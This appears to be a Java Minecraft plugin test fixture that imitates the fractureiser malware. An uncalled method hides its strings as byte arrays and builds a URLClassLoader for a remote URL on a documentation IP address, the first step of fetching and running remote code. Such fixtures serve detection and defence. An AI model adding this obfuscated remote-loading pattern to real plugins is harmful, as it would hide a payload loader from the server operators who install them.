package fixture;

import org.bukkit.plugin.java.JavaPlugin;
import java.net.URL;

public final class Main extends JavaPlugin {
    @Override
    public void onEnable() {}

    // Fixture code: never called. Every name is written as numbers, the way real samples
    // hide theirs: https://github.com/trigram-mrp/fractureiser/blob/main/docs/tech.md
    // The address is a documentation address and nothing is contacted.
    void unused() throws Exception {
        // "192.0.2.10"
        String host = new String(new byte[] {49, 57, 50, 46, 48, 46, 50, 46, 49, 48});
        // "http", "/addon"
        URL url = new URL(new String(new byte[] {104, 116, 116, 112}), host, 8080, new String(new byte[] {47, 97, 100, 100, 111, 110}));
        // "java.net.URLClassLoader"
        Class<?> loader = Class.forName(new String(new byte[] {106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114}));
        loader.getConstructor(URL[].class).newInstance((Object) new URL[] {url});
    }
}
